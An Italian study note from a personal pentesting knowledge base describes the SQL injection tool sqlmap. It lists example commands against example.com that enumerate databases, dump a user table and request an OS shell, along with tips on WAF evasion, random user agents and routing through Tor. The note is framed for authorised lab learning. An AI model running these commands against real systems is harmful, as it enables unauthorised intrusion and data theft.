---
tipo: entita
tag: [tool, web, sql]
fase: 2
fonti: 3
aggiornato: 2026-06-20
stato: maturo
aliases: ["sqlmap"]

---

# sqlmap

> **Nota etica**: sqlmap va usato esclusivamente su applicazioni proprie o su ambienti autorizzati (DVWA, [[PortSwigger Web Academy]], macchine HackTheBox/TryHackMe). Usarlo su sistemi reali senza permesso esplicito è illegale e perseguibile penalmente.

## Cos'è

**sqlmap** è uno strumento open source a riga di comando che **automatizza il rilevamento e lo sfruttamento di vulnerabilità SQL Injection**. Supporta tutti i principali database (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, ecc.) e tecniche di injection (in-band, blind boolean, blind time-based, out-of-band). È lo standard de facto per il testing di SQLi.

## Uso tipico

```bash
# Scansione base di un URL con parametro GET vulnerabile
sqlmap -u "http://example.com/prodotti?id=1"

# Con cookie di sessione autenticata
sqlmap -u "http://example.com/profilo?id=1" --cookie="session=abc123"

# Richiesta POST (es. form di login)
sqlmap -u "http://example.com/login" --data="user=admin&pass=test"

# Elencare i database trovati
sqlmap -u "http://example.com/?id=1" --dbs

# Elencare le tabelle di un database
sqlmap -u "http://example.com/?id=1" -D nome_database --tables

# Estrarre i dati di una tabella
sqlmap -u "http://example.com/?id=1" -D nome_database -T utenti --dump

# Usare una richiesta HTTP salvata da Burp Suite
sqlmap -r richiesta.txt

# Modalità veloce con livello e rischio alti (più test, più rumoroso)
sqlmap -u "http://example.com/?id=1" --level=5 --risk=3

# Tentare di ottenere una shell OS (se DB ha privilegi)
sqlmap -u "http://example.com/?id=1" --os-shell
```

Parametri chiave:

| Opzione | Significato |
|---------|-------------|
| `-u` | URL target |
| `--dbs` | Elenca i database |
| `-D`, `-T`, `-C` | Seleziona database, tabella, colonna |
| `--dump` | Estrae i dati |
| `--level` | Livello di test (1-5, default 1) |
| `--risk` | Rischio di danni (1-3, usare 1 per default) |
| `--batch` | Non chiede conferma (risposta automatica) |
| `--tor` | Usa Tor per anonimizzare le richieste |

## Quando si usa

- Durante la fase di **exploitation** del web pentesting, dopo aver identificato un parametro potenzialmente vulnerabile a [[SQL Injection]]
- Per **verificare rapidamente** se un parametro è vulnerabile (rilevazione automatica di 6 tecniche di injection)
- Per **estrarre dati** dal database (credenziali, dati sensibili) in ambienti lab autorizzati
- Con `-r richiesta.txt` per testare richieste complesse catturate con [[Burp Suite]]

## Note e trucchi

- Inizia sempre con `--level=1 --risk=1` (default) per essere meno invasivo; aumenta solo se necessario
- `--batch` evita le domande interattive: utile negli script automatizzati
- `--tamper` applica script di evasione WAF (es. `tamper=space2comment` cambia gli spazi in commenti SQL)
- `--random-agent` cambia lo User-Agent ad ogni richiesta
- I risultati vengono salvati in `~/.local/share/sqlmap/output/<target>/`
- sqlmap può essere molto rumoroso nei log del server: in ambienti reali (autorizzati) questo è rilevato facilmente dai SIEM

## Collegamenti

- [[SQL Injection]]
- [[Burp Suite]]
- [[OWASP Top 10]]
- [[PortSwigger Web Academy]]
- [[Autenticazione e Gestione Sessioni]]

## Fonti

- sqlmap Official Site: https://sqlmap.org/
- sqlmap GitHub: https://github.com/sqlmapproject/sqlmap
- HackTricks sqlmap: https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
